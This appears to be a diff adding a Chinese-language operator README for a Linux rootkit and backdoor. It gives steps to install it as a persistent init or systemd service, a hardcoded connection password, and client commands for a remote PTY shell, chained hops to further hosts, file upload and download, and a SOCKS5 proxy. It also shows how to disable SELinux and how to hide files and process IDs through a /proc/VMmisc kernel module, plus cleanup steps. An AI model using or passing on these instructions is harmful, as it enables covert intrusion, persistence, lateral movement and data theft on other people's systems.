@@ -1,0 +1,108 @@
+
+
+说明: linux 服务启动有两种, 如果执行 systemctl 命令存在,
+用 systemctl.sh 安装. 不存在使用 install.sh 安装.
+
+
+安装:
+把 install 上传目标机器.
+添加执行权限 chmod +x install.sh or systemctl.sh
+执行 install.sh or systemctl.sh 没有出现任何错误, 出现 -- ok -- 是安装成功
+
+保存此信息,用于删除.
+ >> ko path: /xxxx
+ >> start path: /xxx
+
+最后删除安装包
+
+//-----------------------------------------------------------------------------
+
+连接密码: testtest
+
+使用操作:
+Usage: ./client ip port password [http/https/ssh] 
+./client 127.0.0.1 8080 testtest https
+
+//  上下键,查看记录
+ #> ?
+ shell           * start pty shell 
+ callrk          [ip:port pass] 
+ exitrk          * exit rk 
+ upload          [local_path remote_path] 
+ download        [remote_path local_path] 
+ socks5          [local_port] 
+ stopsk5         * stop socks5 
+
+ exit            exit all 
+ 
+
+串联:
+ callrk 127.0.0.1:22 pass
+ 
+退出当前串联:
+ exitrk
+ 
+完全退出:
+ exit
+ 
+开启代理:
+ socks5 5555	// 5555 本地端口
+ 
+关闭代理:
+ stopsk5
+
+上传:
+ upload /tmp/6666 /tmp/7777
+
+下载:
+ download /tmp/6666 /tmp/8888
+
+shell:
+ shell
+ 
+退出 shell:
+ exit
+
+shell 时, 系统在开启 selinux 时, 执行 systemctl 命令,有权限检查. 
+需要先临时关闭 selinux 
+执行: setenforce 0 (关闭)	setenforce 1 (开启)
+
+//-----------------------------------------------------------------------------
+// 隐藏文件/目录 222
+ echo "+f222" > /proc/VMmisc
+// 显示文件 222
+ echo "-f222" > /proc/VMmisc
+
+
+// 隐藏 pid 666
+ echo "+p666" > /proc/VMmisc
+// 显示 pid 666
+ echo "-p666" > /proc/VMmisc
+
+
+//----------------------------------------------------------------------
+删除文件
+
+// 安装时 保留的路径
+ >> ko path: /etc/cc87f4d8
+ >> start path: /etc/init.d/cc87f4d8
+
+// 1. 
+// 关闭 ko 隐藏
+ echo "dm" > /proc/VMmisc
+ rmmod VMmisc.ko 
+
+ rm -rf /etc/cc87f4d8
+ rm -rf /etc/init.d/cc87f4d8
+
+
+// 2. systemctl
+// 关闭 ko 隐藏
+ echo "dm" > /proc/VMmisc
+ rmmod VMmisc.ko 
+
+ rm -rf /etc/cc87f4d8
+
+ rm -rf /etc/systemd/system//cc87f4d8.service
+
+
